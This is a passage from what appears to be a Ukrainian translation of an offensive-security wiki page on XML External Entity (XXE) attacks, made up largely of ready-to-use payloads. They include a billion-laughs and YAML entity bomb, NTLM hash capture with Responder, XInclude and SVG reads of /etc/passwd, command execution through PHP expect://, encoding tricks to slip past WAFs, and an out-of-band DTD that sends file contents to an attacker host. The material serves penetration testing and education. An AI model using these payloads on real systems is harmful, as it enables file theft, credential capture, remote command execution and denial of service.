5. –ü—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –æ–ø–µ—Ä–∞—Ü—ñ—ó –±—É–¥—å-—è–∫—ñ —Ç–∏–º—á–∞—Å–æ–≤—ñ —Ñ–∞–π–ª–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –ø—ñ–¥ —á–∞—Å —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É, –≤–∏–¥–∞–ª—è—é—Ç—å—Å—è.

–¶—ñ–∫–∞–≤–æ—é —Ç–µ—Ö–Ω—ñ–∫–æ—é –¥–ª—è –ø–µ—Ä–µ—Ä–∏–≤–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –Ω–∞ –¥—Ä—É–≥–æ–º—É –∫—Ä–æ—Ü—ñ —î —Ç—Ä–∏–º–∞–Ω–Ω—è –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–µ—Å–∫—ñ–Ω—á–µ–Ω–Ω–æ –¥–æ–≤–≥–æ –ø—Ä–∏ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ —Ñ–∞–π–ª—É –∞—Ä—Ö—ñ–≤—É. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, –¥–æ—Å—Ç—É–ø–Ω—ñ –≤ [—Ü—å–æ–º—É —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution), –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è —Ü—ñ—î—ó —Ü—ñ–ª—ñ, –≤–∫–ª—é—á–∞—é—á–∏ —Å–µ—Ä–≤–µ—Ä Python (`slow_http_server.py`) —Ç–∞ —Å–µ—Ä–≤–µ—Ä Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
–ó–∞–ø–∏—Å —Ñ–∞–π–ª—ñ–≤ —É —Ç–∏–º—á–∞—Å–æ–≤–∏–π –∫–∞—Ç–∞–ª–æ–≥ –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏ **–∑–±—ñ–ª—å—à–∏—Ç–∏ —ñ–Ω—à—É –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —è–∫–∞ –≤–∫–ª—é—á–∞—î —Ç—Ä–∞–Ω—Å–≤–µ—Ä—Å–∞–ª —à–ª—è—Ö—É** (—Ç–∞–∫—É —è–∫ –ª–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —ñ–Ω'—î–∫—Ü—ñ—è —à–∞–±–ª–æ–Ω—ñ–≤, XSLT RCE, –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è —Ç–æ—â–æ).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### –ê—Ç–∞–∫–∞ "–ú—ñ–ª—å—è—Ä–¥ —Å–º—ñ—Ö—ñ–≤"
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### –ê—Ç–∞–∫–∞ Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### –ö–≤–∞–¥—Ä–∞—Ç–∏—á–Ω–∞ –∞—Ç–∞–∫–∞ –Ω–∞ —Ä–æ–∑–ø—É—Ö–∞–Ω–Ω—è

![](<../.gitbook/assets/image (531).png>)

#### –û—Ç—Ä–∏–º–∞–Ω–Ω—è NTML

–ù–∞ —Ö–æ—Å—Ç–∞—Ö Windows –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ö–µ—à NTML –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –æ–±—Ä–æ–±–Ω–∏–∫ responder.py:
```bash
Responder.py -I eth0 -v
```
—ñ –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## –ü—Ä–∏—Ö–æ–≤–∞–Ω—ñ –ø–æ–≤–µ—Ä—Ö–Ω—ñ XXE

### XInclude

–ü—Ä–∏ —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö –∫–ª—ñ—î–Ω—Ç–∞ –≤ —Å–µ—Ä–≤–µ—Ä–Ω—ñ XML-–¥–æ–∫—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ —Ç—ñ, —â–æ –º—ñ—Å—Ç—è—Ç—å—Å—è –≤ –∑–∞–ø–∏—Ç–∞—Ö SOAP –Ω–∞ –±–æ—Ü—ñ —Å–µ—Ä–≤–µ—Ä–∞, –ø—Ä—è–º–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ—é XML —á–∞—Å—Ç–æ –æ–±–º–µ–∂–µ–Ω–∏–π, —â–æ —É—Å–∫–ª–∞–¥–Ω—é—î —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω—ñ –∞—Ç–∞–∫–∏ XXE —á–µ—Ä–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ –∑–º—ñ–Ω—É –µ–ª–µ–º–µ–Ω—Ç–∞ `DOCTYPE`. –û–¥–Ω–∞–∫ –∞—Ç–∞–∫–∞ `XInclude` –Ω–∞–¥–∞—î —Ä—ñ—à–µ–Ω–Ω—è, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤—Å—Ç–∞–≤–ª—è—Ç–∏ –∑–æ–≤–Ω—ñ—à–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ –≤ –±—É–¥—å-—è–∫–∏–π –µ–ª–µ–º–µ–Ω—Ç –¥–∞–Ω–∏—Ö XML-–¥–æ–∫—É–º–µ–Ω—Ç—É. –¶–µ–π –º–µ—Ç–æ–¥ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π –Ω–∞–≤—ñ—Ç—å —Ç–æ–¥—ñ, –∫–æ–ª–∏ –º–æ–∂–Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –ª–∏—à–µ —á–∞—Å—Ç–∏–Ω—É –¥–∞–Ω–∏—Ö —É —Å—Ç–≤–æ—Ä–µ–Ω–æ–º—É —Å–µ—Ä–≤–µ—Ä–æ–º XML-–¥–æ–∫—É–º–µ–Ω—Ç—ñ.

–î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ `XInclude` –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–≥–æ–ª–æ—Å–∏—Ç–∏ –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω `XInclude` —Ç–∞ –≤–∫–∞–∑–∞—Ç–∏ —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É –¥–ª—è –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ—ó –∑–æ–≤–Ω—ñ—à–Ω—å–æ—ó —Å—É—Ç–Ω–æ—Å—Ç—ñ. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –ª–∞–∫–æ–Ω—ñ—á–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ —Ç–æ–≥–æ, —è–∫ –º–æ–∂–Ω–∞ —Å—Ñ–æ—Ä–º—É–ª—é–≤–∞—Ç–∏ —Ç–∞–∫—É –∞—Ç–∞–∫—É:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó!

### SVG - –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

–§–∞–π–ª–∏, —è–∫—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å –¥–æ –ø–µ–≤–Ω–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤, –∞ –ø–æ—Ç—ñ–º –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ, –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —É —Å–ø–æ—Å–æ–±—ñ –æ–±—Ä–æ–±–∫–∏ XML –∞–±–æ —Ñ–∞–π–ª—ñ–≤, —â–æ –º—ñ—Å—Ç—è—Ç—å XML. –†–æ–∑–ø–æ–≤—Å—é–¥–∂–µ–Ω—ñ —Ñ–æ—Ä–º–∞—Ç–∏ —Ñ–∞–π–ª—ñ–≤, —Ç–∞–∫—ñ —è–∫ –æ—Ñ—ñ—Å–Ω—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∏ (DOCX) —Ç–∞ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è (SVG), –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ XML.

–ö–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ **–∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**, —Ü—ñ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è –∞–±–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ. –ù–∞–≤—ñ—Ç—å –¥–ª—è –¥–æ–¥–∞—Ç–∫—ñ–≤, —è–∫—ñ –æ—á—ñ–∫—É—é—Ç—å —Ñ–æ—Ä–º–∞—Ç–∏, —Ç–∞–∫—ñ —è–∫ PNG –∞–±–æ JPEG, **–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ –æ–±—Ä–æ–±–∫–∏ –∑–æ–±—Ä–∞–∂–µ–Ω—å —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂–µ —Ç–∞–∫–æ–∂ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è SVG**. SVG, —è–∫ —Ñ–æ—Ä–º–∞—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ XML, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏ –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–∏—Ö –∑–æ–±—Ä–∞–∂–µ–Ω—å SVG, —Ç–∏–º —Å–∞–º–∏–º –≤–∏–∫—Ä–∏–≤–∞—é—á–∏ —Å–µ—Ä–≤–µ—Ä –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XXE (–∑–æ–≤–Ω—ñ—à–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ XML).

–ù–∏–∂—á–µ –ø–æ–∫–∞–∑–∞–Ω–æ –ø—Ä–∏–∫–ª–∞–¥ —Ç–∞–∫–æ—ó –∞—Ç–∞–∫–∏, –¥–µ –∑–ª–æ–≤–º–∏—Å–Ω–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è SVG –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω—ñ —Ñ–∞–π–ª–∏:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
–©–µ –æ–¥–∏–Ω –º–µ—Ç–æ–¥ –ø–æ–ª—è–≥–∞—î –≤ —Å–ø—Ä–æ–±—ñ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏** —á–µ—Ä–µ–∑ –æ–±–≥–æ—Ä—Ç–∫—É PHP "expect":
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
–£ –æ–±–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö —Ñ–æ—Ä–º–∞—Ç SVG –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–ø—É—Å–∫—É –∞—Ç–∞–∫, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –æ–±—Ä–æ–±–∫–∏ XML –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —Å–µ—Ä–≤–µ—Ä–∞, —â–æ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –Ω–∞–¥—ñ–π–Ω–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –≤–≤–µ–¥–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö —Ç–∞ –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó!

**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ –ø—Ä–æ—á–∏—Ç–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É –∞–±–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—É –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑'—è–≤–∏—Ç—å—Å—è –£–°–ï–†–ï–î–ò–ù–Ü —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è. –¢–æ–º—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ SVG-–∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è.**

### **PDF - –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É**

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø–æ—Å—Ç, —â–æ–± **–¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ XXE –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: –í—ñ–¥ x-www-urlencoded –¥–æ XML

–Ø–∫—â–æ –∑–∞–ø–∏—Ç POST –ø—Ä–∏–π–º–∞—î –¥–∞–Ω—ñ —É —Ñ–æ—Ä–º–∞—Ç—ñ XML, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ XXE –≤ —Ü—å–æ–º—É –∑–∞–ø–∏—Ç—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –∑–≤–∏—á–∞–π–Ω–∏–π –∑–∞–ø–∏—Ç –º—ñ—Å—Ç–∏—Ç—å –Ω–∞—Å—Ç—É–ø–Ω–µ:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
–¢–æ–¥—ñ –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç –∑ —Ç–∞–∫–∏–º —Å–∞–º–∏–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: –í—ñ–¥ JSON –¥–æ XEE

–î–ª—è –∑–º—ñ–Ω–∏ –∑–∞–ø–∏—Ç—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp –ø—ñ–¥ –Ω–∞–∑–≤–æ—é "**Content Type Converter**". [–¢—É—Ç](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ü–µ–π –ø—Ä–∏–∫–ª–∞–¥:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
–Ü–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ –æ–±—Ö—ñ–¥—É

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
–¶–µ –ø—Ä–∞—Ü—é—î –ª–∏—à–µ —É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä XML –ø—Ä–∏–π–º–∞—î –ø—Ä–æ—Ç–æ–∫–æ–ª `data://`.

### UTF-7

–í–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–∞ UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### –§–∞–π–ª:/ –ü—Ä–æ—Ç–æ–∫–æ–ª Bypass

–Ø–∫—â–æ –≤–µ–±-—Å–∞–π—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP, –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `file:/`, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **php wrappers** `php://filter/convert.base64-encode/resource=` –¥–ª—è **–¥–æ—Å—Ç—É–ø—É –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —Ñ–∞–π–ª—ñ–≤**.

–Ø–∫—â–æ –≤–µ–±-—Å–∞–π—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î Java, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ [**jar: –ø—Ä–æ—Ç–æ–∫–æ–ª**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

–•–∏—Ç –≤—ñ–¥ [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
–í–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å—É—Ç–Ω—ñ—Å—Ç—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ**, –∫–æ–¥—É—é—á–∏ —ó—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **html entities**, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —ó—ó –¥–ª—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è dtd**.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ **HTML Entities** –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ **—á–∏—Å–ª–æ–≤–∏–º–∏** (—è–∫ —É —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ [—Ç—É—Ç](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
–ü—Ä–∏–∫–ª–∞–¥ DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## –û–±–≥–æ—Ä—Ç–∫–∏ PHP

### Base64

**–í–∏–¥–æ–±—É—Ç–∏** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **–í–∏–¥–æ–±—É—Ç–æ–∫ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### –í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É

**–Ø–∫—â–æ –º–æ–¥—É–ª—å PHP "expect" –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ —ñ–Ω—Å–ø—ñ—Ä–æ–≤–∞–Ω–∏–π [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

